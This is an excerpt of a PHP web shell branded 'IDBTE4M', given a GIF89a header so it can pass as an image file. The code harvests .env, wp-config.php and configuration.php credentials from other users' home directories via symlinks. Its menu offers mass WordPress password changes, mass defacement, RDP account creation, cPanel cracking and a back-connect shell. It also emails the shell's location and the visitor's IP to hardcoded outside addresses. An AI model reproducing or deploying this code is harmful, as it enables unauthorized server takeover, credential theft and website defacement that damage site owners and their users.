GIF89a
<meta http-equiv="Content-Type" content="application/.php">
<center>
<?php
...
@symlink('/home/'.$user.'/public_html/.env',$user.'-lara.txt');
...
@symlink('/home/'.$user.'/public_html/.env',$user.'-lav.txt');
@symlink('/home/'.$user.'/public_html/public/.env',$user.'-lav.txt');
@symlink('/home/'.$user.'/public_html/admin/.env',$user.'-lav.txt');
...
"/home/$user_kuontol/public_html/.env" => "lara",
"/home/$user_kuontol/public_html/public/.env" => "lara",
"/home/$user_kuontol/public_html/admin/.env" => "lara",
"/home/$user_kuontol/public_html/laravel/.env" => "lara",
"/home/$user_kuontol/configuration.php" => "Config",
"/home/$user_kuontol/wp-config.php" => "Wp",
...
if($_GET['cok'] == 'nganua') {
	if($_POST['byarr']) {
		...
		<input type='submit' name='byarr' value='Edit' style='width: 215px;'>
		</form>";
	}
}
if($_GET['ngirim'] == 'zh') {
...
echo '<center>';
		...
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='kefiex404'><br>
		<u>Domains</u>: <br>
...
$tujuanmail = 'tampungan.bakdur@gmail.com,kefiex@hotmail.com,idb.code87@outlook.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "IDBTE4M Shell", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
}
?>
<?php 
...
<ul>
<li><a href="?">Home</a></li>
<li><a href="?do=wpm">Wp Mass Change</a></li>
<li><a href="?do=jumping">Salto</a></li>
<li><a href="?cok=nganu">Mass Depes</a></li>
<li><a href="?do=RDP">RDP Create</a></li>
<li><a href="?do=config">Config Grab</a></li>
<li><a href="?do=config2">Config Grab v2</a></li><br><br>
<li><a href="?do=tolls">Cp Krek</a>
<li><a href="?cok=bc">Bakunek</a>
<li><a href="?cok=nganua">Ngedit User</a>
<li><a href="?ngirim=zh">Ngirim ZH</a>
</ul></center></div><br>';
echo 'IDBTE4M #>';
if(isset($_GET['path'])){
    $path = $_GET['path'];   
